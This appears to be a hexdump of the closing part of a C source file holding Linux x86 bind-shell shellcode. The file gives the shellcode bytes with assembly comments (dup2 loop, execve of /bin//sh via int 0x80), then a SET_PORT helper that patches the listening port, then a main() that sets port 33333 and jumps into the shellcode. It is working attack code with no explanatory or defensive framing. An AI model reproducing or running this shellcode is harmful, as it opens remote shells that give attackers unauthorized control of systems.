00001380  6a 6e 73 20 20 20 20 34  38 20 3c 64 75 70 5f 6c  |jns    48 <dup_l|
00001390  6f 6f 70 3e 0d 0a 22 5c  78 62 30 5c 78 30 62 22  |oop>.."\xb0\x0b"|
000013a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000013b0  20 20 20 09 2f 2f 6d 6f  76 20 20 20 20 24 30 78  |   .//mov    $0x|
000013c0  62 2c 25 61 6c 0d 0a 22  5c 78 35 32 22 20 20 20  |b,%al.."\x52"   |
000013d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000013e0  20 20 20 09 2f 2f 70 75  73 68 20 20 20 25 65 64  |   .//push   %ed|
000013f0  78 0d 0a 22 5c 78 36 38  5c 78 32 66 5c 78 32 66  |x.."\x68\x2f\x2f|
00001400  5c 78 37 33 5c 78 36 38  22 20 20 20 20 20 20 20  |\x73\x68"       |
00001410  20 20 20 2f 2f 70 75 73  68 20 20 20 24 30 78 36  |   //push   $0x6|
00001420  38 37 33 32 66 32 66 0d  0a 22 5c 78 36 38 5c 78  |8732f2f.."\x68\x|
00001430  32 66 5c 78 36 32 5c 78  36 39 5c 78 36 65 22 20  |2f\x62\x69\x6e" |
00001440  20 20 20 20 20 20 20 20  20 2f 2f 70 75 73 68 20  |         //push |
00001450  20 20 24 30 78 36 65 36  39 36 32 32 66 0d 0a 22  |  $0x6e69622f.."|
00001460  5c 78 38 39 5c 78 65 33  22 20 20 20 20 20 20 20  |\x89\xe3"       |
00001470  20 20 20 20 20 20 20 20  20 20 20 20 09 2f 2f 6d  |            .//m|
00001480  6f 76 20 20 20 20 25 65  73 70 2c 25 65 62 78 0d  |ov    %esp,%ebx.|
00001490  0a 22 5c 78 35 32 22 20  20 20 20 20 20 20 20 20  |."\x52"         |
000014a0  20 20 20 20 20 20 20 20  20 20 20 20 20 09 2f 2f  |             .//|
000014b0  70 75 73 68 20 20 20 25  65 64 78 0d 0a 22 5c 78  |push   %edx.."\x|
000014c0  35 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |53"             |
000014d0  20 20 20 20 20 20 20 20  20 09 2f 2f 70 75 73 68  |         .//push|
000014e0  20 20 20 25 65 62 78 0d  0a 22 5c 78 38 39 5c 78  |   %ebx.."\x89\x|
000014f0  65 31 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |e1"             |
00001500  20 20 20 20 20 20 09 2f  2f 6d 6f 76 20 20 20 20  |      .//mov    |
00001510  25 65 73 70 2c 25 65 63  78 0d 0a 22 5c 78 63 64  |%esp,%ecx.."\xcd|
00001520  5c 78 38 30 22 3b 20 20  20 20 20 20 20 20 20 20  |\x80";          |
00001530  20 20 20 20 20 20 20 20  20 09 2f 2f 69 6e 74 20  |         .//int |
00001540  20 20 20 24 30 78 38 30  0d 0a 0d 0a 76 6f 69 64  |   $0x80....void|
00001550  20 53 45 54 5f 50 4f 52  54 28 63 68 61 72 20 2a  | SET_PORT(char *|
00001560  62 75 66 2c 20 69 6e 74  20 70 6f 72 74 29 20 7b  |buf, int port) {|
00001570  0d 0a 09 2a 28 75 6e 73  69 67 6e 65 64 20 73 68  |...*(unsigned sh|
00001580  6f 72 74 20 2a 29 28 28  28 62 75 66 29 2b 32 32  |ort *)(((buf)+22|
00001590  29 29 20 3d 20 28 70 6f  72 74 29 3b 0d 0a 09 63  |)) = (port);...c|
000015a0  68 61 72 20 74 6d 70 20  3d 20 62 75 66 5b 32 32  |har tmp = buf[22|
000015b0  5d 3b 0d 0a 09 62 75 66  5b 32 32 5d 20 3d 20 62  |];...buf[22] = b|
000015c0  75 66 5b 32 33 5d 3b 0d  0a 09 62 75 66 5b 32 33  |uf[23];...buf[23|
000015d0  5d 20 3d 20 74 6d 70 3b  0d 0a 7d 0d 0a 0d 0a 6d  |] = tmp;..}....m|
000015e0  61 69 6e 28 29 7b 0d 0a  09 70 72 69 6e 74 66 28  |ain(){...printf(|
000015f0  22 73 69 7a 65 3a 20 25  64 20 62 79 74 65 73 5c  |"size: %d bytes\|
00001600  6e 22 2c 20 73 74 72 6c  65 6e 28 73 63 29 29 3b  |n", strlen(sc));|
00001610  0d 0a 09 0d 0a 09 53 45  54 5f 50 4f 52 54 28 73  |......SET_PORT(s|
00001620  63 2c 20 33 33 33 33 33  29 3b 0d 0a 09 5f 5f 61  |c, 33333);...__a|
00001630  73 6d 5f 5f 28 22 63 61  6c 6c 20 73 63 22 29 3b  |sm__("call sc");|
00001640  0d 0a 7d                                          |..}|
00001643
